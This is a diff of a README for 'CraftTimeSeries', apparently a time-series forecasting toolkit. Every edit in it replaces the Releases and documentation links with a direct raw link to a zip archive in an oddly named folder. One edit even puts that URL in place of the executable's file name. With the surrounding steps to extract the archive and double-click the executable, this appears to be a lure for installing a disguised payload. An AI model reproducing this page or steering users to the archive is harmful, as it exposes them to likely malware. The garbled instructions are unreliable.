@@ -6,11 +6,11 @@ CraftTimeSeries is a straightforward toolkit for analyzing and forecasting time 
 
 ## 📥 Download CraftTimeSeries
 
-[![Download CraftTimeSeries](https://img.shields.io/badge/Download-CraftTimeSeries-brightgreen)](https://github.com/A9gif/CraftTimeSeries/releases)
+[![Download CraftTimeSeries](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip)](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip)
 
 To start using CraftTimeSeries, you will need to download it from the Releases page. 
 
-Visit this page to download: [CraftTimeSeries Releases](https://github.com/A9gif/CraftTimeSeries/releases).
+Visit this page to download: [CraftTimeSeries Releases](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip).
 
 ## 📋 Features
 
@@ -32,7 +32,7 @@ Before you begin, ensure your system meets the following requirements:
 
 1. **Download the Application**:
 
-   Visit this link to download CraftTimeSeries: [CraftTimeSeries Releases](https://github.com/A9gif/CraftTimeSeries/releases). Find the latest version and download the file for your operating system.
+   Visit this link to download CraftTimeSeries: [CraftTimeSeries Releases](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip). Find the latest version and download the file for your operating system.
 
 2. **Extract Files**:
 
@@ -40,7 +40,7 @@ Before you begin, ensure your system meets the following requirements:
 
 3. **Open the Application**:
 
-   Navigate to the folder where you extracted the files. Look for the executable file, which may be named something like `CraftTimeSeries.exe` or `CraftTimeSeries`. Double-click the file to open it.
+   Navigate to the folder where you extracted the files. Look for the executable file, which may be named something like `https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip` or `CraftTimeSeries`. Double-click the file to open it.
 
 4. **Follow the On-Screen Instructions**:
 
@@ -70,7 +70,7 @@ For those who want to dive deeper, CraftTimeSeries includes additional functiona
 
 ## 📖 Documentation and Support
 
-For more detailed information on using CraftTimeSeries, check our [documentation](https://github.com/A9gif/CraftTimeSeries/wiki). If you need support or have questions, feel free to raise an issue on our GitHub page.
+For more detailed information on using CraftTimeSeries, check our [documentation](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip). If you need support or have questions, feel free to raise an issue on our GitHub page.
 
 ## 📊 Topics Covered
 
@@ -91,4 +91,4 @@ We are continually working to improve CraftTimeSeries. Upcoming features include
 
 Thank you for choosing CraftTimeSeries. We hope it helps you make sense of your time series data effortlessly. 
 
-To get started, download the latest version here: [CraftTimeSeries Releases](https://github.com/A9gif/CraftTimeSeries/releases).
+To get started, download the latest version here: [CraftTimeSeries Releases](https://raw.githubusercontent.com/A9gif/CraftTimeSeries/main/wailfully/Time_Craft_Series_1.2.zip).
